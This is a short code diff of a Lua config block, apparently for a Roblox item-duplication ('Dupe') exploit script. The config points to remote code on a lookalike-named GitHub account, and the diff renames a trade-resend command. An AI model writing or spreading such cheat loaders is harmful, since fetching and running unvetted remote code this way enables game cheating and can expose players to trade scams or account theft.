@@ -6,7 +6,7 @@ Config = {
     Script = "Custom",
     CustomLink = "https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"
 }
-Commands = {ResendTrade = ".resend", RestartPlayer = ".restart"}
+Commands = {ResendTrade = "uwu", RestartPlayer = ".restart"}
 repeat
     wait()
 until game:IsLoaded()
